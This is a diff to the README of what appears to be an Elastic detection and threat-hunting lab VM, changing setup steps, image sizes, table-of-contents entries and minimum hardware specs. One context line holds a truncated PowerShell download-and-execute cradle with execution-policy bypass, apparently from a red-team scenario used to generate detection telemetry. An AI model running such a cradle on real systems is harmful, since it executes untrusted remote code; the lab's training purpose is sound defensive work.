@@ -10,6 +10,15 @@ Enchance your analysis, detection and threat hunting skills in an Elastic focuse
  1. [Test, Detect, Understand](#test-detect-and-understand)
  2. [Download](#download)
  3. [Installation](#installation)
+ 4. [Remeber](#remember)
+ 5. [Red Team Scenarios](#red-team-scenarios)
+ 6. [Intergrations](intergrations)
+ 7. [Data Streams](data-streams)
+ 8. [VM Credentials](vm-credentials)
+ 9. [VM Minimum Requiments](vm-minimum-requiments)
+ 10. [VM Specs](vm-specs)
+
+---
 
 ## Test, Detect and Understand
 
@@ -46,9 +55,10 @@ With the Elastic agent ingesting Sysmon, Powershell, wineventlogs, Endpoint Moni
   6. Select storage path for the virtual machine
   7. Select `Import`
   8. Importing the VM can take some time
-  9. Take Snapshot prior to start machine
+  9. Right click on your new VM
+  10. Take Snapshot prior to starting machine
 
-<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/snapshot.png" width=75% height=75%>  
+<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/snapshot.png" width=50% height=50%>  
   
 ## Remember
 
@@ -62,7 +72,7 @@ With the Elastic agent ingesting Sysmon, Powershell, wineventlogs, Endpoint Moni
   
 Open Kibana and search for fleet managment.  
 
-<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/fleet_server1.png" width=75% height=75%>  
+<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/fleet_server1.png" width=50% height=50%>  
 
 if it shows that the agent is offline / unhealhy you will need to restart the agent by running the `Restart_Elastic_Agent.bat` as administrator.  
   
@@ -207,8 +217,8 @@ powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadS
 
 ## VM Minimum Requiments
 
-* 8 GB RAM
-* 4 CPU
+* 4 GB RAM
+* 2 CPU
 * 60GB Storage
 
 ## VM Specs
